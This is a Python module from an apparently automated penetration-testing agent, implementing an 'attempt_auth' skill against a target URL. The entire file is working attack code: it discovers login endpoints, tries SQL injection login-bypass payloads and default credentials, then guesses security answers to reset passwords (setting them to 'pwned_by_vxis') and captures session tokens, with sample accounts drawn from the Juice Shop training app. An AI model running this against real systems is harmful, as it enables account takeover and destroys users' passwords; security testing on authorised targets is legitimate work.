"""Skill: attempt_auth — try to authenticate via multiple methods."""
from __future__ import annotations
import asyncio
import logging
from typing import Any
from ._payload_loader import load_skill_dataset as _load_ds

logger = logging.getLogger(__name__)

# Default credentials to try
DEFAULT_CREDS = [tuple(_c) for _c in _load_ds("attempt_auth", "default_creds")]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# SQLi bypass payloads
SQLI_CREDS = [tuple(_c) for _c in _load_ds("attempt_auth", "sqli_creds")]  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common login endpoint patterns
LOGIN_PATHS = _load_ds("attempt_auth", "login_paths")  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json

# Common password reset patterns
RESET_PATHS = _load_ds("attempt_auth", "reset_paths")  # ADR-007 Phase 3-9 — data in data/payloads/attempt_auth.json


async def execute(target_url: str, **kwargs: Any) -> dict[str, Any]:
    """Try multiple authentication methods against the target.

    Returns:
        {
            "authenticated": bool,
            "method": str,  # "default_creds", "sqli_bypass", "password_reset"
            "token": str,
            "user_info": dict,
            "login_endpoint": str,
            "credentials_used": dict,
            "all_attempts": [{"endpoint": ..., "creds": ..., "status": int}, ...],
        }
    """
    import httpx

    target = target_url.rstrip("/")
    all_attempts: list[dict] = []
    result = {
        "authenticated": False, "method": "", "token": "",
        "user_info": {}, "login_endpoint": "", "credentials_used": {},
        "all_attempts": all_attempts,
    }

    async with httpx.AsyncClient(base_url=target, timeout=10, verify=False) as c:
        # Phase 1: Find login endpoint
        active_login = ""
        for path in LOGIN_PATHS:
            try:
                r = await c.post(path, json={"email": "x", "password": "x"})
                if r.status_code != 404:
                    active_login = path
                    logger.info("Found login endpoint: %s (status %d)", path, r.status_code)
                    break
            except Exception:
                continue

        if not active_login:
            # Try GET-based login forms
            for path in ["/login", "/signin", "/#/login"]:
                try:
                    r = await c.get(path)
                    if r.status_code == 200 and ("password" in r.text.lower() or "login" in r.text.lower()):
                        active_login = path.replace("/#/", "/rest/user/")  # guess REST endpoint
                        break
                except Exception:
                    continue

        if not active_login:
            return {**result, "error": "No login endpoint found"}

        # Phase 2: Try SQLi bypass first (highest value)
        for email, pwd in SQLI_CREDS:
            try:
                r = await c.post(active_login, json={"email": email, "password": pwd})
                attempt = {"endpoint": active_login, "creds": f"{email}:{pwd}", "status": r.status_code}
                all_attempts.append(attempt)

                if r.status_code == 200:
                    data = r.json()
                    token = ""
                    user_info = {}
                    # Try common token locations
                    for key_path in [("authentication", "token"), ("token",), ("access_token",), ("data", "token")]:
                        d = data
                        for k in key_path:
                            d = d.get(k, {}) if isinstance(d, dict) else {}
                        if isinstance(d, str) and len(d) > 20:
                            token = d
                            break
                    # Extract user info
                    auth = data.get("authentication", data)
                    user_info = {
                        "email": auth.get("umail", auth.get("email", "")),
                        "role": auth.get("role", ""),
                        "id": auth.get("bid", auth.get("id", "")),
                    }
                    if token:
                        logger.info("SQLi auth bypass SUCCESS: %s", email)
                        return {
                            **result,
                            "authenticated": True, "method": "sqli_bypass",
                            "token": token, "user_info": user_info,
                            "login_endpoint": active_login,
                            "credentials_used": {"email": email, "password": pwd},
                        }
            except Exception:
                continue

        # Phase 3: Try default credentials
        for email, pwd in DEFAULT_CREDS:
            try:
                r = await c.post(active_login, json={"email": email, "password": pwd})
                attempt = {"endpoint": active_login, "creds": f"{email}:{pwd}", "status": r.status_code}
                all_attempts.append(attempt)

                if r.status_code == 200:
                    data = r.json()
                    token = ""
                    for key_path in [("authentication", "token"), ("token",), ("access_token",)]:
                        d = data
                        for k in key_path:
                            d = d.get(k, {}) if isinstance(d, dict) else {}
                        if isinstance(d, str) and len(d) > 20:
                            token = d
                            break
                    if token:
                        logger.info("Default creds SUCCESS: %s:%s", email, pwd)
                        return {
                            **result,
                            "authenticated": True, "method": "default_creds",
                            "token": token, "login_endpoint": active_login,
                            "credentials_used": {"email": email, "password": pwd},
                        }
            except Exception:
                continue

        # Phase 4: Try password reset with common security answers
        for reset_path in RESET_PATHS:
            try:
                # First check if endpoint exists
                r = await c.post(reset_path, json={"email": "test", "answer": "x", "new": "x", "repeat": "x"})
                if r.status_code == 404:
                    continue

                # Try common email+answer combos
                common_resets = [
                    ("admin@juice-sh.op", ["Samuel", "admin", "Admin"]),
                    ("jim@juice-sh.op", ["Samuel", "Kirk", "Enterprise"]),
                    ("admin", ["admin", "password", "root"]),
                ]
                for email, answers in common_resets:
                    for ans in answers:
                        r = await c.post(reset_path, json={
                            "email": email, "answer": ans,
                            "new": "pwned_by_vxis", "repeat": "pwned_by_vxis",
                        })
                        if r.status_code == 200:
                            # Try logging in with new password
                            r2 = await c.post(active_login, json={
                                "email": email, "password": "pwned_by_vxis",
                            })
                            if r2.status_code == 200:
                                data = r2.json()
                                token = ""
                                for key_path in [("authentication", "token"), ("token",)]:
                                    d = data
                                    for k in key_path:
                                        d = d.get(k, {}) if isinstance(d, dict) else {}
                                    if isinstance(d, str) and len(d) > 20:
                                        token = d
                                        break
                                if token:
                                    logger.info("Password reset SUCCESS: %s answer=%s", email, ans)
                                    return {
                                        **result,
                                        "authenticated": True, "method": "password_reset",
                                        "token": token, "login_endpoint": active_login,
                                        "credentials_used": {"email": email, "security_answer": ans},
                                        "reset_endpoint": reset_path,
                                    }
            except Exception:
                continue

    return {**result, "all_attempts": all_attempts}
